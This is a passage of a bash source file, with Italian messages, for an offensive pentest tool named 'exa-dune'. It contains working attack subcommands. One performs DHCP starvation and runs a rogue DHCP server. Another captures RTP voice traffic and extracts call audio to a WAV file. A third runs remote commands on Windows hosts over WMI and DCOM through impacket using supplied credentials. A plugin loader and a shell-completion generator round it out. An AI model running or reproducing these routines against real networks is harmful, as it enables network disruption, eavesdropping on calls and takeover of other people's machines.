cmd_completion() {
    local shell="${1:-bash}"
    local all_cmds="scan web sip smb creds snmp ftp ssh telnet mqtt modbus upnp ssl tftp rtsp onvif js dns ipmi coap mdns wsd bacnet rtmp cam-cve sip-fuzz enip vnc rdp ldap redis http post fw auto pipeline report network-sweep self-test diff install wordlists update resume schedule firmware voip-enum config-audit history nuclei mitm poison pivot vpn printer amqp log4shell sqli ssrf xxe opcua dnp3 ble jwt msf config completion dhcp rtp dcom plugins help version"
    if [[ "$shell" == "zsh" ]]; then
        local _zsh_cmds="$all_cmds"
        printf '%s\n' "#compdef exa-dune" \
            "_exa_dune() {" \
            "  local -a subcmds" \
            "  subcmds=(${_zsh_cmds})" \
            "  _arguments '1:subcommand:(\$subcmds)' '*:: :->args'" \
            "}" \
            '_exa_dune "$@"'
    else
        # bash completion
        cat <<BASHEOF
_exa_dune_complete() {
    local cur="\${COMP_WORDS[COMP_CWORD]}"
    local cmds="${all_cmds}"
    COMPREPLY=(\$(compgen -W "\${cmds}" -- "\${cur}"))
}
complete -F _exa_dune_complete exa-dune
BASHEOF
    fi
    echo ""
    echo "# Per attivare:"
    if [[ "$shell" == "zsh" ]]; then
        echo "# exa-dune completion zsh > ~/.zsh/completions/_exa-dune"
        echo "# fpath=(~/.zsh/completions \$fpath) in ~/.zshrc"
    else
        echo "# exa-dune completion bash > /etc/bash_completion.d/exa-dune"
        echo "# oppure: source <(exa-dune completion bash)"
    fi
}

# ============================================================
#  SUBCOMMAND: dhcp
# ============================================================
cmd_dhcp() {
    local iface="" duration=30 mode="starvation"
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --iface)    _req_arg "$1" "${2:-}"; iface="$2";    shift 2 ;;
            --duration) _req_arg "$1" "${2:-}"; duration="$2"; shift 2 ;;
            --mode)     _req_arg "$1" "${2:-}"; mode="$2";     shift 2 ;;
            --dry-run)  DRY_RUN=1; shift ;;
            --help|-h)  echo "Uso: exa-dune dhcp --iface <IFACE> [--duration SEC] [--mode starvation|rogue|both]"; exit 0 ;;
            -*)         err "Opzione sconosciuta: $1"; exit 1 ;;
        esac
    done
    [[ -z "$iface" ]] && { err "--iface richiesto"; exit 1; }
    check_root

    local ts; ts=$(date +%Y%m%d_%H%M%S)
    OUTDIR_BASE="${OUTDIR_BASE:-/root/pentest/exa-dune-dhcp_${ts}}"
    [[ $DRY_RUN -eq 0 ]] && mkdir -p "$OUTDIR_BASE"
    _log_file="$OUTDIR_BASE/dhcp.log"

    section "DHCP Attack — iface=$iface mode=$mode duration=${duration}s"

    # Cattura traffico DHCP con tcpdump
    if [[ $DRY_RUN -eq 0 ]]; then
        log "Avvio cattura DHCP su $iface per ${duration}s..."
        tcpdump -i "$iface" -w "$OUTDIR_BASE/dhcp_capture.pcap" \
            "port 67 or port 68" &>/dev/null &
        local _tcpdump_pid=$!
    else
        echo -e "${CYAN}[DRY-RUN]${NC} tcpdump -i $iface -w $OUTDIR_BASE/dhcp_capture.pcap port 67 or port 68"
    fi

    if [[ "$mode" == "starvation" || "$mode" == "both" ]]; then
        section "DHCP Starvation"
        if command -v dhcpstarv &>/dev/null; then
            if [[ $DRY_RUN -eq 1 ]]; then
                echo -e "${CYAN}[DRY-RUN]${NC} dhcpstarv -i $iface"
            else
                timeout "$duration" dhcpstarv -i "$iface" 2>&1 | \
                    tee "$OUTDIR_BASE/dhcpstarv.txt" || true
                found MEDIUM "DHCP starvation eseguito su $iface per ${duration}s"
            fi
        elif command -v yersinia &>/dev/null; then
            if [[ $DRY_RUN -eq 1 ]]; then
                echo -e "${CYAN}[DRY-RUN]${NC} yersinia dhcp -attack 1 -interface $iface"
            else
                timeout "$duration" yersinia dhcp -attack 1 -interface "$iface" \
                    2>&1 | tee "$OUTDIR_BASE/yersinia_starv.txt" || true
                found MEDIUM "DHCP starvation via yersinia su $iface"
            fi
        else
            warn "dhcpstarv e yersinia non disponibili — installa uno dei due"
        fi
    fi

    if [[ "$mode" == "rogue" || "$mode" == "both" ]]; then
        section "Rogue DHCP Server"
        if command -v dnsmasq &>/dev/null; then
            local rogue_range="192.168.1.200,192.168.1.250"
            if [[ $DRY_RUN -eq 1 ]]; then
                echo -e "${CYAN}[DRY-RUN]${NC} dnsmasq --no-daemon --interface=$iface --dhcp-range=$rogue_range --no-resolv"
            else
                log "Avvio rogue DHCP server: range $rogue_range per ${duration}s"
                timeout "$duration" dnsmasq --no-daemon \
                    --interface="$iface" \
                    --dhcp-range="$rogue_range" \
                    --no-resolv \
                    --log-dhcp \
                    2>&1 | tee "$OUTDIR_BASE/rogue_dhcp.txt" || true
                found HIGH "Rogue DHCP server attivo su $iface — range $rogue_range"
            fi
        else
            warn "dnsmasq non disponibile: apt install dnsmasq"
        fi
    fi

    # Ferma cattura tcpdump
    if [[ $DRY_RUN -eq 0 && -n "${_tcpdump_pid:-}" ]]; then
        kill "$_tcpdump_pid" 2>/dev/null || true
        ok "PCAP salvato: $OUTDIR_BASE/dhcp_capture.pcap"
    fi

    ok "DHCP attack completato → $OUTDIR_BASE"
}

# ============================================================
#  SUBCOMMAND: rtp
# ============================================================
cmd_rtp() {
    local target="" iface="" duration=60 pcap=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --iface)    _req_arg "$1" "${2:-}"; iface="$2";    shift 2 ;;
            --duration) _req_arg "$1" "${2:-}"; duration="$2"; shift 2 ;;
            --pcap)     _req_arg "$1" "${2:-}"; pcap="$2";     shift 2 ;;
            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)  DRY_RUN=1; shift ;;
            --help|-h)  echo "Uso: exa-dune rtp [TARGET] [--iface IFACE] [--duration SEC] [--pcap FILE]"; exit 0 ;;
            -*)         err "Opzione sconosciuta: $1"; exit 1 ;;
            *)          target="$1"; shift ;;
        esac
    done
    check_root

    local ts; ts=$(date +%Y%m%d_%H%M%S)
    OUTDIR_BASE="${OUTDIR_BASE:-/root/pentest/exa-dune-rtp_${ts}}"
    [[ $DRY_RUN -eq 0 ]] && mkdir -p "$OUTDIR_BASE"
    _log_file="$OUTDIR_BASE/rtp.log"

    section "RTP Stream Analysis"

    # Rileva interfaccia se non specificata
    if [[ -z "$iface" ]]; then
        iface=$(ip route show 2>/dev/null | grep -oP 'dev \K\S+' | head -1 || echo "eth0")
    fi

    local pcap_file="${pcap:-$OUTDIR_BASE/rtp_capture.pcap}"

    if [[ -z "$pcap" ]]; then
        # Cattura passiva RTP (porte RTP standard 16384-32767)
        section "Cattura passiva RTP (${duration}s)"
        local _filter="udp portrange 16384-32767"
        [[ -n "$target" ]] && _filter="$_filter and host $target"
        if [[ $DRY_RUN -eq 1 ]]; then
            echo -e "${CYAN}[DRY-RUN]${NC} tcpdump -i $iface -w $pcap_file '$_filter' &"
            echo -e "${CYAN}[DRY-RUN]${NC} sleep $duration; kill tcpdump"
        else
            log "Cattura RTP su $iface per ${duration}s → $pcap_file"
            timeout "$duration" tcpdump -i "$iface" -w "$pcap_file" "$_filter" \
                2>&1 | tee "$OUTDIR_BASE/tcpdump_rtp.log" || true
            ok "PCAP RTP salvato: $pcap_file"
        fi
    fi

    # Analisi PCAP con rtpdump se disponibile
    if [[ $DRY_RUN -eq 0 && -f "$pcap_file" ]]; then
        section "Analisi stream RTP"
        if command -v rtpdump &>/dev/null; then
            rtpdump -F ascii "$pcap_file" 2>/dev/null | \
                tee "$OUTDIR_BASE/rtp_streams.txt" || true
            local _stream_count
            _stream_count=$(grep -c "^source=" "$OUTDIR_BASE/rtp_streams.txt" 2>/dev/null || echo 0)
            [[ "$_stream_count" -gt 0 ]] && found MEDIUM "RTP: $_stream_count stream rilevati nel PCAP"
        fi

        # Estrai payload audio con ffmpeg se disponibile
        if command -v ffmpeg &>/dev/null; then
            log "Estrazione audio da PCAP con ffmpeg..."
            ffmpeg -i "$pcap_file" -ar 8000 \
                "$OUTDIR_BASE/rtp_audio.wav" 2>/dev/null || true
            [[ -f "$OUTDIR_BASE/rtp_audio.wav" ]] && \
                found HIGH "RTP audio estratto: $OUTDIR_BASE/rtp_audio.wav"
        fi

        # Statistiche base con tshark se disponibile
        if command -v tshark &>/dev/null; then
            tshark -r "$pcap_file" -q -z rtp,streams 2>/dev/null | \
                tee "$OUTDIR_BASE/rtp_stats.txt" || true
            ok "Statistiche RTP: $OUTDIR_BASE/rtp_stats.txt"
        fi
    else
        [[ $DRY_RUN -eq 1 ]] && {
            echo -e "${CYAN}[DRY-RUN]${NC} rtpdump -F ascii $pcap_file"
            echo -e "${CYAN}[DRY-RUN]${NC} ffmpeg -i $pcap_file -ar 8000 $OUTDIR_BASE/rtp_audio.wav"
            echo -e "${CYAN}[DRY-RUN]${NC} tshark -r $pcap_file -q -z rtp,streams"
        }
    fi

    ok "RTP analysis completato → $OUTDIR_BASE"
}

# ============================================================
#  SUBCOMMAND: dcom
# ============================================================
cmd_dcom() {
    local target="" username="" password="" domain="" command_exec=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --user|-u)    _req_arg "$1" "${2:-}"; username="$2"; shift 2 ;;
            --pass|-p)    _req_arg "$1" "${2:-}"; password="$2"; shift 2 ;;
            --domain|-d)  _req_arg "$1" "${2:-}"; domain="$2";   shift 2 ;;
            --exec)       _req_arg "$1" "${2:-}"; command_exec="$2"; shift 2 ;;
            --output)     _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)    DRY_RUN=1; shift ;;
            --help|-h)    echo "Uso: exa-dune dcom <TARGET> [-u USER] [-p PASS] [-d DOMAIN] [--exec CMD]"; exit 0 ;;
            -*)           err "Opzione sconosciuta: $1"; exit 1 ;;
            *)            target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; exit 1; }
    validate_target "$target"
    setup_outdir "$target" "dcom"

    section "DCOM/WMI Audit — $target"
    log "Target: $target | Output: $OUTDIR"

    # Verifica prerequisiti (porte 135/445)
    section "Verifica porte DCOM/WMI (135, 445)"
    if [[ $DRY_RUN -eq 1 ]]; then
        echo -e "${CYAN}[DRY-RUN]${NC} nmap -sV -p 135,445,593 $target"
    else
        nmap -sV -p 135,445,593 $NMAP_TIMING \
            -oN "$OUTDIR/nmap_dcom.txt" "$target" 2>/dev/null | \
            tee "$OUTDIR/nmap_dcom_screen.txt" || true
        if grep -qE "135/tcp.*open|445/tcp.*open" "$OUTDIR/nmap_dcom.txt" 2>/dev/null; then
            found MEDIUM "DCOM/RPC port 135 aperta su $target"
        fi
        # Verifica OS Windows
        if grep -qi "windows\|microsoft" "$OUTDIR/nmap_dcom.txt" 2>/dev/null; then
            found MEDIUM "OS Windows rilevato su $target — DCOM attack surface"
        fi
    fi

    # WMI enumeration con impacket
    if command -v impacket-wmiexec &>/dev/null || command -v wmiexec.py &>/dev/null; then
        local _wmi_cmd; _wmi_cmd=$(command -v impacket-wmiexec 2>/dev/null || command -v wmiexec.py 2>/dev/null)
        local _auth=""
        [[ -n "$domain" ]]   && _auth="${domain}/"
        [[ -n "$username" ]] && _auth="${_auth}${username}"
        [[ -n "$password" ]] && _auth="${_auth}:${password}"
        [[ -z "$_auth" ]]    && _auth="anonymous"

        section "WMI Enumeration (impacket)"
        local _cmd_str="${command_exec:-whoami}"
        if [[ $DRY_RUN -eq 1 ]]; then
            echo -e "${CYAN}[DRY-RUN]${NC} $_wmi_cmd ${_auth}@${target} '$_cmd_str'"
        else
            timeout 30 "$_wmi_cmd" "${_auth}@${target}" \
                -nointeractive -shell-type cmd \
                "$_cmd_str" 2>&1 | \
                tee "$OUTDIR/wmiexec_output.txt" || true
            if grep -qi "windows\|system32\|NT AUTHORITY" "$OUTDIR/wmiexec_output.txt" 2>/dev/null; then
                found CRITICAL "WMI Remote Execution riuscita su $target come ${_auth}"
            fi
        fi
    else
        warn "impacket-wmiexec non disponibile: apt install python3-impacket"
    fi

    # DCOM exec con impacket-dcomexec
    if command -v impacket-dcomexec &>/dev/null && [[ -n "$username" && -n "$password" ]]; then
        section "DCOM Exec (impacket-dcomexec)"
        local _dauth="${domain:+${domain}/}${username}:${password}"
        if [[ $DRY_RUN -eq 1 ]]; then
            echo -e "${CYAN}[DRY-RUN]${NC} impacket-dcomexec ${_dauth}@${target} '${command_exec:-whoami}'"
        else
            timeout 30 impacket-dcomexec \
                "${_dauth}@${target}" \
                -object MMC20 \
                "${command_exec:-whoami}" 2>&1 | \
                tee "$OUTDIR/dcomexec_output.txt" || true
            if grep -qi "microsoft\|windows\|NT AUTHORITY" "$OUTDIR/dcomexec_output.txt" 2>/dev/null; then
                found CRITICAL "DCOM Exec riuscita su $target"
            fi
        fi
    fi

    ok "DCOM audit completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: plugins
# ============================================================
_load_plugins() {
    local plugin_dir="${HOME}/.exa-dune/plugins"
    [[ ! -d "$plugin_dir" ]] && return 0
    local _found_any=0
    for plugin in "$plugin_dir"/*.sh; do
        [[ -f "$plugin" ]] || continue   # salta glob letterale se nessun file
        _found_any=1
        if source "$plugin" 2>/dev/null; then
            log "Plugin caricato: $(basename "$plugin")"
        else
            warn "Plugin fallito: $(basename "$plugin")"
        fi
    done
    return 0
}

cmd_plugins() {
    local plugin_dir="${HOME}/.exa-dune/plugins"
    case "${1:-list}" in
        list)
            echo "Plugin directory: $plugin_dir"
            if [[ -d "$plugin_dir" ]]; then
                local _found=0
                for p in "$plugin_dir"/*.sh; do
                    [[ -f "$p" ]] && { echo "  $(basename "$p")"; _found=1; }
                done
                [[ $_found -eq 0 ]] && echo "  (nessun plugin installato)"
            else
                echo "  (nessun plugin installato)"
            fi
            ;;
        create)
            local name="${2:-myplugin}"
            mkdir -p "$plugin_dir"
            cat > "$plugin_dir/${name}.sh" <<'PLUGEOF'
# exa-dune plugin template
# Name: __PLUGIN_NAME__
# Description: Custom module
# Usage: exa-dune __PLUGIN_NAME__ <target>

usage___PLUGIN_NAME__() {
    echo "Uso: exa-dune __PLUGIN_NAME__ <TARGET> [OPTIONS]"
}

cmd___PLUGIN_NAME__() {
    local target="${1:-}"
    [[ -z "$target" ]] && { err "TARGET mancante"; exit 1; }
    setup_outdir "$target" "__PLUGIN_NAME__"
    section "__PLUGIN_NAME__ scan"
    log "Target: $target"
    # Aggiungi qui la logica del plugin
    found LOW "__PLUGIN_NAME__ — completato su $target"
    ok "Output: $OUTDIR"
}

# Register in dispatcher (automatic via plugin system)
EXA_PLUGIN_CMDS["__PLUGIN_NAME__"]="cmd___PLUGIN_NAME__"
PLUGEOF
            sed -i "s/__PLUGIN_NAME__/$name/g" "$plugin_dir/${name}.sh"
            ok "Plugin template creato: $plugin_dir/${name}.sh"
            ;;
        dir)
            mkdir -p "$plugin_dir"
            echo "$plugin_dir"
            ;;
        *)
            err "Uso: exa-dune plugins [list|create <nome>|dir]"
            exit 1
            ;;
    esac
}

# ── Progress tracking ────────────────────────────────────────
_TOTAL_MODS=0
_DONE_MODS=0
_progress_bar() {
    local done=$1 total=$2 label="${3:-}"
    [[ $total -eq 0 ]] && return
    local pct=$(( done * 100 / total ))
    local filled=$(( done * 20 / total ))
    local bar=""
    for ((i=0; i<filled; i++)); do bar+="█"; done
    for ((i=filled; i<20; i++)); do bar+="░"; done
    printf "\r  [%s] %3d%% (%d/%d) %s" "$bar" "$pct" "$done" "$total" "$label"
    [[ $done -eq $total ]] && echo ""
}

